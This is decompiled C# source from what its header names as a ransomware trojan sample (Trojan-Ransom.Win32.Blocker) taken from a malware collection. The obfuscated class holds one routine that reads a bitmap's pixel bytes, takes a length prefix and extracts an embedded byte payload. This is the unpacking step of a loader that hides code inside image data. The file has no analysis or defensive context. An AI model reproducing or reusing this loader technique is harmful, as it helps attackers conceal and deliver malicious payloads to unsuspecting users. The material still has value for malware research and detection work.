// Decompiled with JetBrains decompiler
// Type: gooahYbXEKO
// Assembly: RSC2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B466AC36-16A4-4FBD-8C55-EFAD432C0748
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00026-msil\Trojan-Ransom.Win32.Blocker.hesp-93c2d31dd4547a53a40c92ce1783e59fe45734b65430ddc8e44f38dae3f62324.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;

[StandardModule]
internal sealed class gooahYbXEKO
{
  public static byte[] bitmapToBytes(Bitmap inputBMP)
  {
    byte[] numArray1 = new byte[checked (Conversions.ToInteger(unchecked ((object) checked (inputBMP.Width * inputBMP.Height * 4))) + 1)];
    object Left1 = (object) 0;
    int num1 = checked (inputBMP.Width - 1);
    int x = 0;
    while (x <= num1)
    {
      int num2 = checked (inputBMP.Width - 1);
      int y = 0;
      while (y <= num2)
      {
        object pixel = (object) inputBMP.GetPixel(x, y);
        numArray1[Conversions.ToInteger(Left1)] = Conversions.ToByte(NewLateBinding.LateGet(pixel, (Type) null, "A", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        object Left2 = Operators.AddObject(Left1, (object) 1);
        numArray1[Conversions.ToInteger(Left2)] = Conversions.ToByte(NewLateBinding.LateGet(pixel, (Type) null, "R", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        object Left3 = Operators.AddObject(Left2, (object) 1);
        numArray1[Conversions.ToInteger(Left3)] = Conversions.ToByte(NewLateBinding.LateGet(pixel, (Type) null, "G", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        object Left4 = Operators.AddObject(Left3, (object) 1);
        numArray1[Conversions.ToInteger(Left4)] = Conversions.ToByte(NewLateBinding.LateGet(pixel, (Type) null, "B", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        Left1 = Operators.AddObject(Left4, (object) 1);
        checked { ++y; }
      }
      checked { ++x; }
    }
    byte[] numArray2 = new byte[8];
    int index1 = 0;
    do
    {
      numArray2[index1] = numArray1[index1];
      checked { ++index1; }
    }
    while (index1 <= 7);
    object Left5 = (object) checked (BitConverter.ToInt64(numArray2, 0) - 1L);
    byte[] bytes = new byte[checked (Conversions.ToInteger(Left5) + 1)];
    int integer = Conversions.ToInteger(Operators.AddObject(Left5, (object) 8));
    int index2 = 8;
    while (index2 <= integer)
    {
      bytes[checked (index2 - 8)] = numArray1[index2];
      checked { ++index2; }
    }
    return bytes;
  }
}
